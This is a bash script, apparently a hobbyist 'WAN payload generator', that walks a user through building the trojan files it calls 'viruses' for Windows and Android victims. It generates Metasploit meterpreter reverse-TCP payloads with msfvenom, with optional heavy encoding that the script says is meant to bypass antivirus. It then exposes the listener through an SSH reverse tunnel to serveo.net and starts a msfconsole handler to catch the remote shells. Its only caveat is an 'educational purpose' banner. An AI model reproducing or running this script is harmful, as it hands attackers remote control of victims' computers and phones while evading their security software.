#!/bin/bash
clear
clr2eol=`tput el`                              
echo -n  "      __               , _    
       /\_\/o    ()     /|/ \   
   _  |    |     /\  __  |   |  
 |/ \_|    ||   /  \/  \_|   |  
 |__/  \__/ |_//(__/\__/ |   |_/
/|                              
\|   The Simple WAN Payload Generator for Noobs by a Noob"
sleep 3
echo -n -e "\r${clr2eol}////////////******SCRIPT BY******//////////"
sleep 3
echo -n -e "\r${clr2eol}////////////******MITESH WANI*******/////// "
sleep 3
echo -n -e "\r${clr2eol}////////////******DEVELOPED FOR*******/////// "
sleep 2
echo -n -e "\r${clr2eol}////////////******EDUCATIONAL PURPOSE******////// "
sleep 2
echo -n -e "\r${clr2eol}////////////******FOR ANY ISSUES AND REPORTS******///// "
sleep 3
echo -n -e "\r${clr2eol}///////////********VISIT GITHUB.COM/MITESHW05/POISON********//////"
sleep 5
echo -n -e "\r${clr2eol}///////////********CHECKING FOR FILES********//////"
sleep 2
 if  gnome-terminal -- cd /Downloads/ngrok-stable-linux-amd64
then
echo "ngrok installed OK!!!(JUST CLOSE THE NEWLY OPENED TERMINAL)"
else
echo "ngrok is not installed , (This Will not affect the script now , but the upcoming feature (port forwarding using ngrok) will not work)(JUST CLOSE THE NEWLY OPENED TERMINAL)"
fi
echo -n -e "\r${clr2eol}//////////*********STARTING***********///////// "
sleep 1
echo -n -e "\r${clr2eol}**************\n  "
sleep 1
echo -n -e "\r${clr2eol}*********************************\n "
sleep 1
echo -n -e "\r${clr2eol}***********************************************************\n "
sleep 1
echo -n -e "\r${clr2eol}****************************************************************************\n "
sleep 1
echo -n -e "\r${clr2eol}************************************************************************************************ \n"
sleep 1
echo -n -e "\r${clr2eol}************************************************************************************************************ \n"
sleep 1
echo -n -e "\r${clr2eol}***************************************************************************************************************************** \n"
sleep 1
while true; do
  echo -e "\n\t\t\t1.Build The Virus!!!\n\t\t\t2.Start Port Forwarding\n\t\t\t3.Start Listening"
 read s
 case $s in 
	[1]* )
echo -e "\tGive me the victim operating system\n\t\t1.windows\n\t\t2.android"
read t
echo -e "\tGive me the listening port(lport)"
read p
echo -e "\tWhat should be the name of your file??"
read n
name=$1
set 'who am i'
while true; do
    echo -e "\tWanna Encode File(For Bypassing Antivirus)??\n\t\t1.Yess Please\n\t\t2.Naah!! I don't worry" 
   read y
    case $y in
        [1]* ) 
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net -e x86/shikata_ga_nai -i 2000 lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000  -o /root/Desktop/$n.exe
fi; break;;
        [2]* ) 
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p  -o /root/Desktop/$n.exe
fi; break;;
        * ) echo "Please answer 1 or 2";;
    esac
done

echo -e "\t\t\tDone!!! Check your Desktop for file HAPPY HACKING@@@"
while true; do
    read -p "Wanna Start Port Forwarding(y/n) " g
    case $g in
        [Yy]* ) echo -e "\n\tWell a good Choice , Wait for a moment"
		gnome-terminal -- ssh -R $p:localhost:$p serveo.net
		echo -e "\n\t\tDone, check the new terminal for details"; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
while true; do
    read -p "Wanna Start Listening(y/n) " yn
    case $yn in
        [Yy]* )
	gnome-terminal -- msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"
	echo "Thanks For using the script!!!"
	sleep 5; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done; break;;
  	[2]* )
	echo "Give me the port no."
	read p
	ssh -R $p:localhost:$p serveo.net
	echo -e "\nDONE!!!"; break;;
	[3]* )
	echo "Give me the port no."
	read p
	echo "Select the operating system(windows/android)"
	read o 
	msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"; break;;
	* ) echo "Please Select Correct option";;
    esac
done
